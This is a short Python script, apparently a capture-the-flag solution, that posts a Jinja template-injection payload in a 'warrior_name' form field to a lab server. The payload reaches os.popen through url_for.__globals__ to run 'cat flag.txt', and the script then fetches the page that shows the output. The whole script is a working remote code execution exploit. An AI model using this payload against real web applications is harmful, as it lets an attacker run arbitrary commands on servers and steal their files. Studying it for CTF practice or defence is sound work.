import requests

# If you hit the up arrow during the `flamedrake` battle page, it displays a hint to use `{{ url_for.__globals__ }}`.


sess = requests.session()
resp = sess.post("http://94.237.61.100:49820/begin", data={"warrior_name": "{{url_for.__globals__.os.popen('cat flag.txt').read()}}"})
resp = sess.post("http://94.237.61.100:49820/battle-report")

print(resp.text)
